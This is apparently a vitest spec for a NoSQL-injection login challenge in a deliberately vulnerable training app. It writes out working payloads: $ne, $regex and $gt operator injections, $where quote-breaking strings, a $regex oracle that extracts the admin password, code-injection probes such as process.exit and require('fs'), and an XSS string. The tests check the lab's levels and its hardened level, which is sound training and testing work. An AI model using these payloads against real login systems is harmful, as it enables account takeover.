// src/districts/relic-market/rm-04-nosql-login/rm-04.spec.ts
import { describe, it, expect } from 'vitest';
import { describeExploitMatrix, describeLabView, freshSession, FLAG_RE, type Agent } from '../../../../tests/helpers.js';
import { LEVELS, type Level } from '../../../core/levels.js';
import { describeCurlExample } from '../../_shared/curl.testkit.js';
import { RM04 } from './challenge.js'; // registers RM-04 before createApp() inside freshSession
import { adminPassword, staffStore } from './model.js';

const LAB = '/d/relic-market/nosql-login';
type Form = Record<string, string>;
const form = (agent: Agent, level: string, body: Readonly<Record<string, string | undefined>> | string) => agent.post(`${LAB}?level=${level}`).type('form').send(body);
const json = (agent: Agent, level: string, body: unknown) => agent.post(`${LAB}?level=${level}`).send(body as object);
const messageOf = (html: string): string => /<p class="lab-message[^>]*>([\s\S]*?)<\/p>/.exec(html)?.[1] ?? '';
const parsed = (s: string): unknown => JSON.parse(s);
const INVALID = 'Invalid username or password.';
const ADMIN_FLAG = /^Welcome, relic_admin \(role: admin\)\. Flag: HVWA\{[0-9a-f]{32}\}$/;

describeExploitMatrix<Form>({
  challenge: RM04,
  path: LAB,
  send: (agent, _level, body, url) => agent.post(url).type('form').send(body),
  exploits: {
    acolyte: { username: 'relic_admin', 'password[$ne]': 'x' },        // the password is an operator object: "not equal to x"
    templar: { username: 'relic_admin', 'password[$regex]': '.' },      // $ne and $gt are on the blacklist, $regex is not
    inquisitor: { username: "relic_admin'//", password: 'x' },          // a quote ends the string in the $where expression, // comments out the password test
  },
  resisted: INVALID,
  legit: [{ name: 'own account pilgrim/pilgrim', input: { username: 'pilgrim', password: 'pilgrim' }, expect: 'Welcome, pilgrim (role: customer).' }],
  malformed: [
    // Operators are refused by the store at Acolyte and Templar; the app-built $where is the only thing Inquisitor evaluates.
    { name: 'unknown operator', input: { username: 'pilgrim', 'password[$foo]': '1' }, levels: ['acolyte', 'templar'] },
    { name: 'lone quote in the username', input: { username: "'", password: 'x' }, levels: ['inquisitor'] },
  ],
  privileged: { name: 'relic_admin with the real Divine password', input: { username: 'relic_admin', password: adminPassword('divine') }, expect: /Welcome, relic_admin \(role: admin\)\./ },
  errorRe: /Query error/,
});

// Bodies that must fail everywhere: no operator that wins, no 500, no flag. (Real exploits are NOT in this list.)
const FAILING_BODIES: unknown[] = [
  { username: ['relic_admin'], password: ['x'] },
  { username: { $foo: 1 }, password: { $foo: 1 } },
  { username: {}, password: {} },
  { username: { a: { b: { c: 1 } } }, password: [[[]]] },
  { username: 'relic_admin', password: parsed('{"__proto__":{"$ne":"x"}}') },
  { username: 'relic_admin', password: parsed('{"constructor":{"$ne":"x"}}') },
  { username: 'relic_admin', password: parsed('{"prototype":{"$ne":"x"}}') },
  { username: parsed('{"__proto__":{"$ne":"x"}}'), password: parsed('{"__proto__":{"$ne":"x"}}') },
  { username: 'relic_admin', password: { $regex: '(a+)+$' } },
  { username: 'relic_admin', password: { $regex: 'a'.repeat(65) } },
  { username: 'relic_admin', password: { $in: Array.from({ length: 21 }, () => 'x') } },
  { username: 'relic_admin', password: { $where: '1' } },
  { username: 'relic_admin', password: { $not: { $not: { $not: { $not: { $not: { $not: { $eq: 'x' } } } } } } } },
  { username: 'relic_admin', password: { $gt: { $ne: 1 } } },
  { username: 'relic_admin', password: 5 }, { username: 'relic_admin', password: null }, { username: 'relic_admin', password: true },
  { username: 'relic_admin', password: parsed('1e999') }, { username: 5, password: 5 }, { username: null, password: null },
  { username: 'relic_admin', password: parsed(`${'['.repeat(300)}${']'.repeat(300)}`) },
  { username: 'relic_admin', password: parsed(`${'{"a":'.repeat(300)}1${'}'.repeat(300)}`) },
  { $where: '1', $ne: 1, username: 'x' }, { toString: 1, valueOf: 1 }, { username: { toString: 1 }, password: { toString: 1, valueOf: 1 } },
  { username: 'x'.repeat(30_000), password: 'y'.repeat(30_000) },
  [], [[]], {},
];

describeLabView({
  challenge: RM04,
  path: LAB,
  account: /Your account: <code>pilgrim<\/code> \/ <code>pilgrim<\/code>/,
  echoField: 'username',
  extra: { password: 'x' },
  oddBodies: FAILING_BODIES,
  ok: (agent, level) => form(agent, level, { username: 'pilgrim', password: 'pilgrim' }),
  bad: (agent, level) => form(agent, level, { username: 'pilgrim', password: 'nope' }),
});

describeCurlExample({ challenge: RM04, path: LAB, curl: () => ({ path: '/', form: ['username=pilgrim', 'password=pilgrim'] }) });

describe('RM-04 NoSQL injection login', () => {
  it('every level has its own random 16-hex admin password, stable per level; the store holds the three staff accounts in order', () => {
    const pw = LEVELS.map((l) => adminPassword(l));
    for (const p of pw) expect(p).toMatch(/^[0-9a-f]{16}$/);
    expect(new Set(pw).size).toBe(LEVELS.length);
    expect(adminPassword('templar')).toBe(adminPassword('templar'));
    for (const l of LEVELS) {
      const s = staffStore(l);
      expect(s.findOne({})).toMatchObject({ username: 'relic_admin', role: 'admin', password: adminPassword(l) });
      expect(s.findOne({ username: 'pilgrim', password: 'pilgrim' })).toMatchObject({ role: 'customer' });
      expect(s.findOne({ username_lc: 'brother_tobias' })).toMatchObject({ username: 'Brother_Tobias', role: 'staff' });
    }
  });

  it('every level answers every odd body with 200 and no flag; Divine answers all of them with the one uniform message and no error text', async () => {
    const { agent } = await freshSession();
    for (const level of LEVELS) {
      for (const body of FAILING_BODIES) {
        const res = await json(agent, level, body);
        const label = `${level} ${JSON.stringify(body).slice(0, 80)}`;
        expect(res.status, label).toBe(200);
        expect(res.text, label).not.toMatch(FLAG_RE);
        if (level === 'divine') {
          expect(messageOf(res.text), label).toBe(INVALID);
          expect(res.text, label).not.toMatch(/Query error|SyntaxError|TypeError/);
        }
      }
    }
  });

  it('form-encoded odd bodies (nested brackets, repeated fields, prototype keys, very deep nesting) are failed logins at every level', async () => {
    const { agent } = await freshSession();
    const deep = `password${'[a]'.repeat(30)}=x`;
    for (const level of LEVELS) {
      for (const body of [
        'username=relic_admin&password[__proto__][$ne]=x', 'username=relic_admin&password[constructor][$ne]=x', 'username=relic_admin&password[prototype][$ne]=x',
        'username[__proto__]=x&password[__proto__]=x', `username=relic_admin&${deep}`, 'username=relic_admin&username=pilgrim&password=a&password=b',
        'username=relic_admin&password[]=x&password[]=y', 'username=relic_admin&password[0]=x', 'username[$ne]=1&username[a]=2&password[$ne]=1&password[b]=2',
        'username=relic_admin&password[$foo]=1&password[$ne]=x', 'password[$ne][$ne]=x', '__proto__[username]=x', 'constructor[prototype][x]=1',
      ]) {
        const res = await form(agent, level, body);
        expect(res.status, `${level} ${body}`).toBe(200);
        expect(res.text, `${level} ${body}`).not.toMatch(FLAG_RE);
      }
    }
    // Past the parser's depth limit the engine itself refuses the body (a 4xx page, never a 5xx), and nothing signs in.
    for (const level of LEVELS) {
      const res = await form(agent, level, `username=relic_admin&password${'[a]'.repeat(60)}=x`);
      expect(res.status, level).toBeLessThan(500);
      expect(res.text, level).not.toMatch(FLAG_RE);
    }
    expect(Object.prototype).not.toHaveProperty('x');
  });

  it('a password found through a $regex oracle at Acolyte earns the Acolyte flag, and logs in nowhere else', async () => {
    const { agent } = await freshSession();
    const hex = '0123456789abcdef';
    let pw = '';
    for (let i = 0; i < 16; i++) {
      let lo = 0;
      let hi = 15;
      while (lo < hi) {
        const mid = (lo + hi) >> 1;
        const res = await form(agent, 'acolyte', { username: 'relic_admin', 'password[$regex]': `^${pw}[${hex[lo]}-${hex[mid]}]` });
        if (/Welcome, relic_admin/.test(res.text)) hi = mid; else lo = mid + 1;
      }
      pw += hex[lo];
    }
    expect(pw).toBe(adminPassword('acolyte'));
    const own = await form(agent, 'acolyte', { username: 'relic_admin', password: pw });
    expect(messageOf(own.text)).toMatch(ADMIN_FLAG);
    const submit = await agent.post('/api/submit').send({ challengeId: 'RM-04', submission: FLAG_RE.exec(own.text)?.[0] });
    expect(submit.body).toMatchObject({ solved: true, level: 'acolyte' });
    for (const level of ['templar', 'inquisitor', 'divine'] as const) {
      const res = await form(agent, level, { username: 'relic_admin', password: pw });
      expect(messageOf(res.text), level).toBe(INVALID);
      expect(res.text, level).not.toMatch(FLAG_RE);
    }
  });

  it('acolyte: the store gets the raw values, so every field operator works; $where is not reachable (the query shape is fixed)', async () => {
    const { agent } = await freshSession();
    for (const body of [
      { username: 'relic_admin', 'password[$gt]': '' }, { username: 'relic_admin', 'password[$gte]': '0' }, { username: 'relic_admin', 'password[$nin][]': 'x' },
      { username: 'relic_admin', 'password[$exists]': 'true' }, { username: 'relic_admin', 'password[$not][$eq]': 'x' }, { 'username[$ne]': 'zzz', 'password[$ne]': 'x' },
      { username: 'relic_admin', 'password[$regex]': '^[0-9a-f]+$' }, { 'username[$regex]': '^RELIC_', 'username[$options]': 'i', 'password[$ne]': 'x' },
    ]) {
      expect(messageOf((await form(agent, 'acolyte', body)).text), JSON.stringify(body)).toMatch(ADMIN_FLAG);
    }
    // A $where sent as a field is just an unknown field operator: the lab never builds a top-level $where here.
    const res = await form(agent, 'acolyte', { username: 'relic_admin', 'password[$where]': '1' });
    expect(messageOf(res.text)).toBe('Query error: unknown operator: $where');
    expect(await form(agent, 'acolyte', { $where: '1', username: 'x', password: 'y' }).then((r) => messageOf(r.text))).toBe(INVALID);
  });

  it('acolyte: a JSON body works the same way', async () => {
    const { agent } = await freshSession();
    const res = await json(agent, 'acolyte', { username: 'relic_admin', password: { $ne: 'x' } });
    expect(messageOf(res.text)).toMatch(ADMIN_FLAG);
  });

  it('templar: $ne and $gt are refused on either field (own keys only); every other operator still works', async () => {
    const { agent } = await freshSession();
    for (const body of [
      { username: 'relic_admin', 'password[$ne]': 'x' }, { username: 'relic_admin', 'password[$gt]': '' }, { 'username[$ne]': 'x', password: 'x' },
      { username: 'relic_admin', 'password[$ne]': 'x', 'password[$regex]': '.' }, { 'username[$gt]': '', 'password[$gt]': '' },
    ]) {
      const res = await form(agent, 'templar', body);
      expect(messageOf(res.text), JSON.stringify(body)).toBe('Hacking attempt blocked.');
      expect(res.text).not.toMatch(FLAG_RE);
    }
    for (const body of [
      { username: 'relic_admin', 'password[$regex]': '.' }, { username: 'relic_admin', 'password[$gte]': '' }, { username: 'relic_admin', 'password[$nin][]': 'x' },
      { username: 'relic_admin', 'password[$exists]': 'true' }, { username: 'relic_admin', 'password[$not][$eq]': 'x' }, { username: 'relic_admin', 'password[$not][$ne]': 'zzz-no' },
      { username: 'relic_admin', 'password[$lt]': 'zzzz' }, { 'username[$regex]': '^relic', 'password[$in][]': adminPassword('templar') },
    ]) {
      const res = await form(agent, 'templar', body);
      // $not around $ne is an equality test (x is not the password): it must not match, $not around $eq matches.
      if (body['password[$not][$ne]'] !== undefined) { expect(res.text).not.toMatch(FLAG_RE); continue; }
      expect(messageOf(res.text), JSON.stringify(body)).toMatch(ADMIN_FLAG);
    }
    // The blacklist looks at own keys: arrays and strings that merely contain the word are not operators.
    expect(messageOf((await form(agent, 'templar', { username: 'relic_admin', password: '$ne' })).text)).toBe(INVALID);
    expect(messageOf((await json(agent, 'templar', { username: 'relic_admin', password: ['$ne'] })).text)).toBe(INVALID);
  });

  it('inquisitor: operators are gone (values are forced to text); the lookup is case-insensitive and built from text', async () => {
    const { agent } = await freshSession();
    for (const body of [
      { username: 'relic_admin', 'password[$ne]': 'x' }, { username: 'relic_admin', 'password[$regex]': '.' }, { 'username[$ne]': 'x', 'password[$ne]': 'x' },
    ]) expect(messageOf((await form(agent, 'inquisitor', body)).text), JSON.stringify(body)).toBe(INVALID);
    expect(messageOf((await form(agent, 'inquisitor', { username: 'RELIC_Admin', password: adminPassword('inquisitor') })).text)).toMatch(ADMIN_FLAG);
    expect(messageOf((await form(agent, 'inquisitor', { username: 'PILGRIM', password: 'pilgrim' })).text)).toBe('Welcome, pilgrim (role: customer).');
    expect(messageOf((await form(agent, 'inquisitor', { username: 'relic_admin', password: 'Pilgrim' })).text)).toBe(INVALID); // the password is exact
    // Text forms of other types are text: an array is its elements joined, an object is "[object Object]".
    expect(messageOf((await json(agent, 'inquisitor', { username: ['pilgrim'], password: ['pilgrim'] })).text)).toBe('Welcome, pilgrim (role: customer).');
  });

  it('inquisitor: a quote ends the string, so the whole condition is the attacker\'s (several ways in), and errors name the expression', async () => {
    const { agent } = await freshSession();
    for (const body of [
      { username: "relic_admin'//", password: 'x' },
      { username: 'pilgrim', password: "x' || 'a' == 'a" },
      { username: "x' || true //", password: 'x' },
      { username: "x' || this.role == 'admin' || 'x'=='y", password: 'x' },
    ]) expect(messageOf((await form(agent, 'inquisitor', body)).text), JSON.stringify(body)).toMatch(ADMIN_FLAG);
    // The first matching document wins, so even "pilgrim" with a forged condition is the admin (the order of the store).
    const broken = await form(agent, 'inquisitor', { username: "'", password: 'x' });
    expect(messageOf(broken.text)).toMatch(/^Query error: SyntaxError: /);
    expect(messageOf(broken.text)).toContain('this.username.toLowerCase()');
    const typed = await form(agent, 'inquisitor', { username: "x' || this.nosuch.length > 1 || '", password: 'x' });
    expect(messageOf(typed.text)).toMatch(/^Query error: TypeError: /);
    expect(typed.text).not.toMatch(FLAG_RE);
    expect(typed.text).not.toContain(adminPassword('inquisitor'));
    const big = await form(agent, 'inquisitor', { username: "'" + 'x'.repeat(5000), password: 'x' });
    expect(messageOf(big.text).length).toBeLessThan(500); // expression clipped
    const wide = await form(agent, 'inquisitor', { username: 'a'.repeat(2000), password: 'x' });
    expect(messageOf(wide.text)).toMatch(/expression too long/);
    // A value that cannot be turned into text is a failed request at this level, not a 500.
    const odd = await json(agent, 'inquisitor', { username: { toString: 1 }, password: 'x' });
    expect(odd.status).toBe(200);
    expect(odd.text).not.toMatch(FLAG_RE);
  });

  it('inquisitor: the evaluator is a parsed subset, so injected code is never run (no globals, no calls, no assignment)', async () => {
    const { agent } = await freshSession();
    for (const payload of [
      "x' || process.exit(1) || '", "x' || globalThis || '", "x' || this.constructor == undefined && eval('1') || '", "x' || Function('return 1')() || '",
      "x' || require('fs') || '", "x' || (() => 1)() || '", "x'; process.exit(1); '", "x' || this.password = 'x' || '", "x' || this['password'] || '",
      "x' || `${1}` || '", "x' || {}.x || '",
    ]) {
      const res = await form(agent, 'inquisitor', { username: payload, password: 'x' });
      expect(res.status, payload).toBe(200);
      expect(messageOf(res.text), payload).toMatch(/^Query error: SyntaxError: /);
      expect(res.text).not.toMatch(FLAG_RE);
    }
  });

  it('divine: the store is queried with $eq only, built by the app, and any non-string is the uniform refusal', async () => {
    const { agent } = await freshSession();
    const real = adminPassword('divine');
    expect(messageOf((await form(agent, 'divine', { username: 'relic_admin', password: real })).text)).toBe('Welcome, relic_admin (role: admin).');
    expect(messageOf((await form(agent, 'divine', { username: 'RELIC_ADMIN', password: real })).text)).toBe('Welcome, relic_admin (role: admin).'); // case-insensitive name
    expect(messageOf((await form(agent, 'divine', { username: 'ｒｅｌｉｃ_ａｄｍｉｎ', password: real })).text)).toBe('Welcome, relic_admin (role: admin).'); // NFKC
    expect(messageOf((await form(agent, 'divine', { username: 'relic_admin', password: real.toUpperCase() })).text)).toBe(real === real.toUpperCase() ? 'Welcome, relic_admin (role: admin).' : INVALID);
    expect(messageOf((await form(agent, 'divine', { username: 'relic_admin', password: `${real} ` })).text)).toBe(INVALID);
    for (const body of [
      { username: 'relic_admin', 'password[$ne]': 'x' }, { username: 'relic_admin', 'password[$regex]': '.' }, { username: "relic_admin'//", password: 'x' },
      { 'username[$ne]': 'x', 'password[$ne]': 'x' }, { username: 'relic_admin', 'password[$foo]': '1' }, { username: 'pilgrim', password: "x' || '1' == '1" },
    ]) expect(messageOf((await form(agent, 'divine', body)).text), JSON.stringify(body)).toBe(INVALID);
    expect(messageOf((await json(agent, 'divine', { username: ['pilgrim'], password: ['pilgrim'] })).text)).toBe(INVALID); // not coerced
    expect(messageOf((await form(agent, 'divine', { username: 'pilgrim', password: 'pilgrim' })).text)).toBe('Welcome, pilgrim (role: customer).');
  });

  it('there is no limiter (a loopback lab: the password is long and random, and the lesson is the injection)', async () => {
    const { agent } = await freshSession();
    for (let i = 0; i < 30; i++) expect(messageOf((await form(agent, 'divine', { username: 'relic_admin', password: `guess${i}` })).text)).toBe(INVALID);
    expect(messageOf((await form(agent, 'acolyte', { username: 'relic_admin', password: adminPassword('acolyte') })).text)).toMatch(ADMIN_FLAG);
  });

  it('shows the store\'s error text below Divine, escaped, as a lab error', async () => {
    const { agent } = await freshSession();
    const res = await form(agent, 'acolyte', { username: 'pilgrim', 'password[$<img src=x>]': '1' });
    expect(res.text).toMatch(/class="lab-message lab-error"[^>]*>Query error: unknown operator: \$&lt;img src=x&gt;/);
    expect(res.text).not.toContain('<img src=x>');
  });

  it('keeps the typed username and password after a POST, escaped, and has no password-type input', async () => {
    const { agent } = await freshSession();
    const res = await form(agent, 'inquisitor', { username: '"><script>alert(1)</script>', password: "<b>'%" });
    const inputs = [...res.text.matchAll(/<input[^>]*>/g)].map((m) => m[0]);
    expect(inputs.find((i) => i.includes('name="username"'))).toContain('value="&#34;&gt;&lt;script&gt;alert(1)&lt;/script&gt;"');
    expect(inputs.find((i) => i.includes('name="password"'))).toContain('value="&lt;b&gt;&#39;%"');
    expect(res.text).not.toMatch(/type="password"/);
  });

  it('shows a JSON curl variant next to the form one', async () => {
    const { agent } = await freshSession();
    const html = (await agent.get(`${LAB}?level=acolyte`)).text;
    expect(html).toContain('--data-urlencode');
    expect(html).toContain('Content-Type: application/json');
    expect(html).toContain('{&#34;username&#34;:&#34;pilgrim&#34;,&#34;password&#34;:&#34;pilgrim&#34;}');
  });

  it('View Source shows the Inquisitor level with the evaluator\'s whole subset spelled out', async () => {
    const { agent } = await freshSession();
    const res = await agent.get('/c/RM-04/source/inquisitor');
    expect(res.status).toBe(200);
    for (const word of ['$where', 'this.', 'toLowerCase()', 'toUpperCase()', 'trim()', 'length', '==', '===', '&&', '||', '//', '1000', '300', '32']) {
      expect(res.text, word).toContain(word.replace(/&/g, '&amp;'));
    }
  });

  it('has no Restart: the lab mutates nothing', async () => {
    const { agent } = await freshSession();
    expect((await agent.post(`${LAB}/_reset?level=acolyte`)).status).toBe(404);
  });

  it('is registered with all four levels', () => {
    const all: readonly Level[] = ['acolyte', 'templar', 'inquisitor', 'divine'];
    expect([...RM04.levels]).toEqual(all);
  });
});
